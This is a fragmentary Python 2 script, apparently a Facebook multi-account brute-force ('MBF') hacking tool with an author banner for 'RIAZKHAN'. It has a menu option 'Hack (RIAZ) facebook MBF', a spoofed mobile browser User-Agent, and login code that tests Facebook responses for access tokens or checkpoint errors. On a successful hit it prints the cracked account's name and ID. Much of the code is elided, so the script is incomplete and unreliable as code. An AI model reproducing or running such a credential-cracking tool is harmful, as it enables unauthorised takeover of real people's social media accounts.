...
br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 10;) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36')]
...
'########::'####::::'###::::'########:
 ...
 ##:::. ##:'####: ##:::: ##: ########:
..:::::..::....::..:::::..::........::
\033[1;41;97mAuthor : RIAZKHAN\033[0m
 """
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m[\033[1;93m●\033[1;97m]\033[1;93m Riazkhan\033[1;97m "+o),;sys.stdout.flush();time.sleep(1)
...
def tokenz():
	...
	try:
		...
		print '\033[1;97m[\033[1;39m✓\033[1;97m]\033[1;39m One With God🤲🦈'
...
def bot_komen():
	...
	post2 = ('___________________////____')
...
def menu():
	...
	print 42*"\033[1;96m="
	print "\x1b[1;93m1.\x1b[1;93m Hack (RIAZ) facebook MBF"
...
def pilih_super():
	...
	if peak =="":
		...
		print logo
		print 42*"\033[1;96m="
		jalan('\033[1;96m[✺] \033[1;93mLogin With New ID \033[1;97m...')
		...
		try:
			...
			if 'access_token' in q:
				...
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[✖] \x1b[1;93mRIAZ💉_CP'
								...
								if 'www.facebook.com' in q["error_msg"]:
									...
									if 'access_token' in q:
										...
										if 'www.facebook.com' in q["error_msg"]:
											...
											if 'access_token' in q:
												print '\x1b[1;96m[✓] \x1b[1;92mRIAZ💉'
												print '\x1b[1;96m[✺] \x1b[1;97mName \x1b[1;91m    : \x1b[1;92m' + b['name']
												print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
